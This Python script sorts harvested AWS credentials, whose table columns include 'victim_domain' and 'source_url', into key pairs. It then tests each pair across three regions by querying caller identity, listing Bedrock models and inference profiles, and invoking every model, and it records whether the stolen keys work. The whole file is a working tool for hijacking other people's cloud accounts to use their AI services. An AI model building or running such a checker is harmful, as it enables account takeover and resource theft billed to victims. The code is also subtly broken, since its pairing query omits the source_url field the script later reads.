import json
import sqlite3
from datetime import datetime, timezone

import boto3


SCHEMA = """
CREATE TABLE credential_records (
    provider TEXT,
    secret TEXT,
    source_url TEXT,
    status TEXT DEFAULT 'unchecked',
    last_checked TEXT,
    victim_domain TEXT,
    key_kind TEXT
)
"""

PAIR_QUERY = """
SELECT access.secret AS access_key_id,
       secret.secret AS secret_access_key,
       token.secret AS session_token
FROM credential_records AS access
JOIN credential_records AS secret
  ON secret.source_url = access.source_url
LEFT JOIN credential_records AS token
  ON token.source_url = access.source_url
WHERE access.key_kind = 'aws_access_key_id'
  AND secret.key_kind = 'aws_secret_access_key'
  AND (token.key_kind = 'aws_session_token' OR token.key_kind IS NULL)
"""

REGIONS = ["us-east-1", "us-west-2", "eu-west-1"]
VALIDATION_STATES = ("unchecked", "valid", "invalid")


def aws_clients(pair, region):
    supplied = {
        "aws_access_key_id": pair["access_key_id"],
        "aws_secret_access_key": pair["secret_access_key"],
        "aws_session_token": pair["session_token"],
        "region_name": region,
    }
    return (
        boto3.client("sts", **supplied),
        boto3.client("bedrock", **supplied),
        boto3.client("bedrock-runtime", **supplied),
    )


def qualify_pair(pair):
    results = []
    for region in REGIONS:
        sts, catalog, runtime = aws_clients(pair, region)
        identity = sts.get_caller_identity()
        models = catalog.list_foundation_models()
        profiles = catalog.list_inference_profiles()
        for model in models.get("modelSummaries", []):
            response = runtime.invoke_model(
                modelId=model["modelId"],
                body=json.dumps({"prompt": "ping", "max_tokens": 1}),
            )
            results.append((region, identity["Arn"], model["modelId"], response["body"]))
        results.extend((region, identity["Arn"], p["inferenceProfileId"], None)
                       for p in profiles.get("inferenceProfileSummaries", []))
    return results


def validate_inventory(db):
    db.row_factory = sqlite3.Row
    for pair in db.execute(PAIR_QUERY):
        try:
            qualify_pair(pair)
            status = "valid"
        except Exception:
            status = "invalid"
        db.execute(
            "UPDATE credential_records SET status = ?, last_checked = ? WHERE source_url = ?",
            (status, datetime.now(timezone.utc).isoformat(), pair["source_url"]),
        )
    db.commit()

